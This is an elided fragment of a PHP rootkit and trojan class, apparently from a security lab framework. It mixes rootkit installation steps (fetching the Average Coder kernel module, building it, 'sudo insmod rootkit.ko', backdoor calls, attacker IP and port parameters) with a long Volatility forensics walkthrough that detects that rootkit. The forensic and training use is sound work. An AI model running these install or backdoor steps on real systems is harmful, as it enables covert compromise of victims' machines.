...
class rootkit4linux extends trojan4linux{
   ...
   */
    ...
    */
    ...
    public function rootkit4linux($stream){
        ...
        if (!$this->ip2backdoor8db($this->ip2id)) $this->backdoor4root();
        $this->rootkit4linux4kerneland();
        $this->rootkit4linux4userland();
        ...
        $data = "lsmod";
        $this->req_str($stream,$data,$this->stream_timeout*2,"");
...
This can be handy to get a list of processes and their PID number.");
    ...
    public function rootkit4linux2puszek($sbin_path_hidden,$attacker_ip,$attacker_port){
    ...
    public function rootkit4linux4userland(){
        $this->titre(__FUNCTION__);
    }
    
    
    public function rootkit4linux4kerneland(){
        $this->titre(__FUNCTION__);
        $this->rootkit4linux4kerneland2lkm();
        $this->rootkit4linux4kerneland2tyton();
    }
    
    public function rootkit4linux4kerneland2lkm(){
        $this->ssTitre(__FUNCTION__);
    ...
    public function rootkit4linux4kerneland2tyton(){
        $this->ssTitre(__FUNCTION__);
    ...
    function poc4rootkit4linux_intro() {
        $this->ssTitre(__FUNCTION__);
...
Since malware will often attempt to connect back to an attacker’s machine in order to transfer data between the attacker and victim, rootkits will commonly attempt to hide those connections to help maintain stealth.	");
    ...
    function poc4rootkit4linux_fonctionnement() {
        $this->ssTitre(__FUNCTION__);
...
In order to hide a certain connection, i replaced the default read function with my own, in which i read entries on that file and skipped those containing the port i needed to hide.");
    ...
    function poc4rootkit4linux_kernel_avgcoder() {
        $this->titre(__FUNCTION__);
        /*
        $this->poc4rootkit4linux_kernel_avgcoder_intro();
        $this->poc4rootkit4linux_kernel_avgcoder_download();
        $this->poc4rootkit4linux_kernel_avgcoder_install();
        $this->poc4rootkit4linux_kernel_avgcoder_execution();
        */
        $this->poc4rootkit4linux_kernel_avgcoder_forensics();
        $this->poc4rootkit4linux_kernel_avgcoder_conclusion();
    }
    function poc4poc4rootkit4linux_kernel_avgcoder_intro() {
        $this->ssTitre(__FUNCTION__);
    ...
    function poc4rootkit4linux_kernel_avgcoder_download() {
        $this->ssTitre(__FUNCTION__);
        $this->net("https://github.com/mfontanini/Programs-Scripts/tree/master/rootkit");
    }
    
    
    function poc4rootkit4linux_kernel_avgcoder_install($stream) {
        $this->ssTitre(__FUNCTION__);
        ...
        if(!$this->file4exist8path($stream, "/tmp/poc4rootkit4linux_kernel_avgcoder.tar.gz")){
            ...
            $this->req_str($stream,$data,$this->stream_timeout,"");
            $data = "cd /tmp/poc4rootkit4linux_kernel_avgcoder; make ; sudo insmod rootkit.ko";
            $this->req_str($stream,$data,$this->stream_timeout,"");
            $this->pause();
        }
    ...
    function poc4rootkit4linux_kernel_avgcoder_execution() {
        $this->ssTitre(__FUNCTION__);
    ...
    function poc4rootkit4linux_kernel_avgcoder_forensics() { 
        $this->ssTitre(__FUNCTION__);
       ...
       // $poc4rootkit4linux_kernel_avgcoder->for4linux_all("");  $this->pause();
        ...
        //$poc4rootkit4linux_kernel_avgcoder->for4linux_investigation_linux_first_pid($rep_path,$vmem,$profile,$pid);exit();
         
        $poc4rootkit4linux_kernel_avgcoder->for4linux_Networking_connexion_netstat(" grep -i 'established' ");

         
        $poc4rootkit4linux_kernel_avgcoder->for4linux_Process_psxview(" | egrep \"($pid|$ppid|$pid_rootkit)\" ");
        $poc4rootkit4linux_kernel_avgcoder->for4linux_Process_psxview_dot();
        $this->pause();
        $poc4rootkit4linux_kernel_avgcoder->for4linux_Process_pslist("--pid=$pid,$ppid");
        $poc4rootkit4linux_kernel_avgcoder->for4linux_Process_pslist_dot();
        $poc4rootkit4linux_kernel_avgcoder->for4linux_Process_pstree("--pid=$pid,$ppid");
        $poc4rootkit4linux_kernel_avgcoder->for4linux_Process_pstree_dot();
        $poc4rootkit4linux_kernel_avgcoder->for4linux_Process_file_open_lsof("--pid=$pid,$ppid");
        $this->titre("Search hidden user");
        $poc4rootkit4linux_kernel_avgcoder->for4linux_Malware_check_hidden_user("");
        $this->note("Deleted entry -> rohff    pts/0        2015-05-05 09:15 (:0.0) ");
        $this->pause();
         
        $this->titre("Search Privilege escalator");
        $poc4rootkit4linux_kernel_avgcoder->for4linux_Malware_check_hidden_privilege_escalator("");
        $this->note("In real investigations, we could now focus our efforts on PID $pid - using the bash plugin would be a good start – as we know that the attacker used that shell in conjunction with the rootkit!");
         ...
         $poc4rootkit4linux_kernel_avgcoder->for4linux_Process_maps("--pid=$pid");
         $this->pause();
         
         $this->titre("Investigation into Suspects Process");
         $poc4rootkit4linux_kernel_avgcoder->for4linux_Malware_plthook("--pid=$pid,$ppid,$pid_rootkit"); // pause();
         $this->pause();
         
         $poc4rootkit4linux_kernel_avgcoder->for4linux_Dump_heap($pid, ""); $this->pause();
         $poc4rootkit4linux_kernel_avgcoder->for4linux_Dump_stack($pid, ""); $this->pause();
         $poc4rootkit4linux_kernel_avgcoder->for4linux_Process_psenv("--pid=$pid,$ppid,$pid_rootkit");
         $this->pause();
         
         $poc4rootkit4linux_kernel_avgcoder->for4linux_Information_library_list("--pid=$pid,$ppid,$pid_rootkit");
         
         $poc4rootkit4linux_kernel_avgcoder->for4linux_Malware_check_hidden_modules_and_dump("");
         $this->todo("dumper apartir de cette adresse ou bien connaitre le nom de t& pour pouvoir le dumper en moddump ");
         $this->pause();
         
         $poc4rootkit4linux_kernel_avgcoder->for4linux_Information_kernel_loaded_modules(" | grep 'rootkit' ");
        $this->note("Volatility was able to report the three hooks placed by Average Coder (readdir from root of proc, write of buddyinfo, and read of modules), by enumerating all the files and directories under /proc and verifying their members.
         ...
         $poc4rootkit4linux_kernel_avgcoder->for4linux_Information_kernel_loaded_modules("--pid=$pid,$ppid,$pid_rootkit -P | tee $this->file_dir/$this->file_name.linux_lsmod_P");
         
         $poc4rootkit4linux_kernel_avgcoder->for4linux_Dump_file("/tmp/VMwareDnD/bffa8b60/avgcoder/rootkit.c", "");
         $this->requette("gedit $this->file_dir/$this->file_name._tmp_VMwareDnD_bffa8b60_avgcoder_rootkit.c.bak");
         $poc4rootkit4linux_kernel_avgcoder->for4linux_Dump_file("/sys/module/rootkit", "");
         
         $this->pause();
         
         $this->ssTitre("Dumping Evidence");
         $file_check_module = $poc4rootkit4linux_kernel_avgcoder->for4linux_Malware_check_modules("");
         ...
         $tab_lkm = file($poc4rootkit4linux_kernel_avgcoder->for4linux_Dump_Module_Kernel($inode_module,"--regex=$module | grep -Po \"$module.0x[0-9a-fA-F]{4,16}.lkm\" ")); // pause();
         ...
         $poc4rootkit4linux_kernel_avgcoder->for4linux_Information_bash_history("");
         $poc4rootkit4linux_kernel_avgcoder->for4linux_Information_bash_history("-P"); // pause();
         $this->pause();
         
         $poc4rootkit4linux_kernel_avgcoder->for4linux_Information_find_file_name("/proc/buddyinfo", "");
         $this->pause();
    }
    function poc4rootkit4linux_kernel_avgcoder_conclusion() {
        $this->ssTitre(__FUNCTION__);
